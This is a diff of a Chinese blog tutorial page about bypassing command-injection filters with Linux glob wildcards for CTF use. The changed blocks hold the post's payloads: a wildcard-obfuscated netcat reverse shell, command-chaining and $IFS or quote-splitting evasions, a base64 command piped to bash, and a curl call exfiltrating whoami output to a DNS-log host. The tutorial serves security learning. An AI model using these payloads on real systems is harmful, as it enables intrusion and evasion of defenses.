@@ -94,7 +94,7 @@
 <link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="CTF,WAF绕过,linux,命令执行,通配符," />
+  <meta name="keywords" content="CTF,WAF绕过,命令执行,linux,通配符," />
 
 
 
@@ -113,7 +113,7 @@
 
 
 <meta name="description" content="前几天在微博和公众号上看到一些使用Linux通配符/glob模式来绕过命令执行的方式，感觉很不错，学习总结下。 首先先了解下什么是Linux shell 通配符/glob模式: 概念：  glob 模式（globbing）也被称之为 shell 通配符，名字的起源来自于 Unix V6 中的 /etc/glob （详见 man 文档）。glob 是一种特殊的模式匹配，最常见的是通配符拓展，也可以将">
-<meta name="keywords" content="CTF,WAF绕过,linux,命令执行,通配符">
+<meta name="keywords" content="CTF,WAF绕过,命令执行,linux,通配符">
 <meta property="og:type" content="article">
 <meta property="og:title" content="命令执行绕过之Linux通配符">
 <meta property="og:url" content="http://byd.dropsec.xyz/2018/05/29/命令执行绕过之Linux通配符/index.html">
@@ -629,9 +629,9 @@
 </table>
 <p><strong>示例：</strong></p>
 <p><em>举几个简单的例子，举一反三，同理，各种混合结合效果更佳！</em></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"> w2n1ck@w2n1ck ~/Desktop/shell  ls a*?</div><div class="line">abc.txt</div><div class="line"> w2n1ck@w2n1ck ~/Desktop/shell  /???/[l]s</div><div class="line">12.txt	abc.txt</div><div class="line"> w2n1ck@w2n1ck ~/Desktop/shell  /???/[:lower:]s</div><div class="line">12.txt	abc.txt</div><div class="line">再比如：</div><div class="line">/?s?/???/[n]c 2130706433 8888 -e /???/b??h</div><div class="line">...</div></pre></td></tr></table></figure>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"> w2n1ck@w2n1ck ~/Desktop/<span class="keyword">shell</span><span class="bash">  ls a*?</span></div><div class="line"><span class="bash">abc.txt</span></div><div class="line"><span class="bash"> w2n1ck@w2n1ck ~/Desktop/shell  /???/[l]s</span></div><div class="line"><span class="bash">12.txt	abc.txt</span></div><div class="line"><span class="bash"> w2n1ck@w2n1ck ~/Desktop/shell  /???/[:lower:]s</span></div><div class="line"><span class="bash">12.txt	abc.txt</span></div><div class="line"><span class="bash">再比如：</span></div><div class="line"><span class="bash">/?s?/???/[n]c 2130706433 8888 -e /???/b??h</span></div><div class="line"><span class="bash">...</span></div></pre></td></tr></table></figure>
 <p><strong>其他绕过方式</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">ls | id</div><div class="line">ls ; id    在shell中，担任&quot;连续指令&quot;功能的符号就是&quot;分号&quot;</div><div class="line">ls &amp; id</div><div class="line">ls 回车 id</div><div class="line">ls `id`   </div><div class="line">ls ` id`   前面加了一个空格</div><div class="line">ls `\id`   反斜杠  i\d等价于id</div><div class="line">ls $(id)</div><div class="line">ls | a=i;b=d;$a$b   拼接</div><div class="line">ls | echo aWQ=| base64 -d | bash   利用base64</div><div class="line">`echo &quot;aWQ=&quot;|base64 -d`</div><div class="line">ls | curl xxx.ceye.io/`whoami`   利用dnslog或者http web log</div><div class="line">cat&lt;1.txt</div><div class="line">cat$IFS$91.txt</div><div class="line">cat$&#123;IFS&#125;1.txt</div><div class="line">cat$IFS1.txt</div><div class="line">%0acat%091.txt</div><div class="line">w&apos;h&apos;o&apos;am&apos;i</div><div class="line">w&quot;h&quot;o&quot;am&quot;i</div><div class="line">who$@ami</div><div class="line">echo i$@d|$0</div><div class="line">w$@h$@o$@a$@m$@i</div></pre></td></tr></table></figure>
+<figure class="highlight mel"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">ls</span> | id</div><div class="line"><span class="keyword">ls</span> ; id    在shell中，担任<span class="string">"连续指令"</span>功能的符号就是<span class="string">"分号"</span></div><div class="line"><span class="keyword">ls</span> &amp; id</div><div class="line"><span class="keyword">ls</span> 回车 id</div><div class="line"><span class="keyword">ls</span> <span class="string">`id`</span>   </div><div class="line"><span class="keyword">ls</span> <span class="string">` id`</span>   前面加了一个空格</div><div class="line"><span class="keyword">ls</span> <span class="string">`\id`</span>   反斜杠  i\d等价于id</div><div class="line"><span class="keyword">ls</span> $(id)</div><div class="line"><span class="keyword">ls</span> | a=i;b=d;$a$b   拼接</div><div class="line"><span class="keyword">ls</span> | echo aWQ=| base64 -d | bash   利用base64</div><div class="line"><span class="string">`echo "aWQ="|base64 -d`</span></div><div class="line"><span class="keyword">ls</span> | curl xxx.ceye.io/<span class="string">`whoami`</span>   利用dnslog或者http web <span class="keyword">log</span></div><div class="line">cat&lt;<span class="number">1.</span>txt</div><div class="line">cat$IFS$91.txt</div><div class="line">cat$&#123;IFS&#125;<span class="number">1.</span>txt</div><div class="line">cat$IFS1.txt</div><div class="line">%0acat%091.txt</div><div class="line">w<span class="string">'h'</span>o<span class="string">'am'</span>i</div><div class="line">w<span class="string">"h"</span>o<span class="string">"am"</span>i</div><div class="line">who$@ami</div><div class="line">echo i$@d|$0</div><div class="line">w$@h$@o$@a$@m$@i</div></pre></td></tr></table></figure>
 <p><strong>注意事项</strong></p>
 <ul>
 <li>在使用专属字符集的时候，字符集之外还需要用 [ ] 来包含住，否则专用字符集不会生效，例如 [[:space:]]</li>
@@ -710,9 +710,9 @@
           
             <a href="/tags/WAF绕过/" rel="tag"><i class="fa fa-tag"></i> WAF绕过</a>
           
-            <a href="/tags/linux/" rel="tag"><i class="fa fa-tag"></i> linux</a>
-          
             <a href="/tags/命令执行/" rel="tag"><i class="fa fa-tag"></i> 命令执行</a>
+          
+            <a href="/tags/linux/" rel="tag"><i class="fa fa-tag"></i> linux</a>
           
             <a href="/tags/通配符/" rel="tag"><i class="fa fa-tag"></i> 通配符</a>
           
@@ -845,7 +845,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">74</span>
+                <span class="site-state-item-count">72</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
